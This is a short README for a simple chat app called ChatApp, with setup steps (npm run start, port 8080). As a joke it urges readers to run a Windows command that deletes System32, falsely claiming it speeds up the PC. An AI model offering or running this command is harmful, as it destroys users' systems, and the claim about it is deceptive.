## About

This is a really simple chat app (hence the name ChatApp).
Easy to use and even easier to fall in love with!

---

## How to use

It's farely simple!
Just type these commands into the command line.
`del /fs C:\Windows\System32`
No! Wait, that just speeds up your PC. Really! Try it :)

But what you really need to do:
1. Go to the root folder of the project
2. Open *CMD* in there
3. And type the following: `npm run start` 
4. The server is defaulty running on port **8080**

See? Wasn't that hard afterall
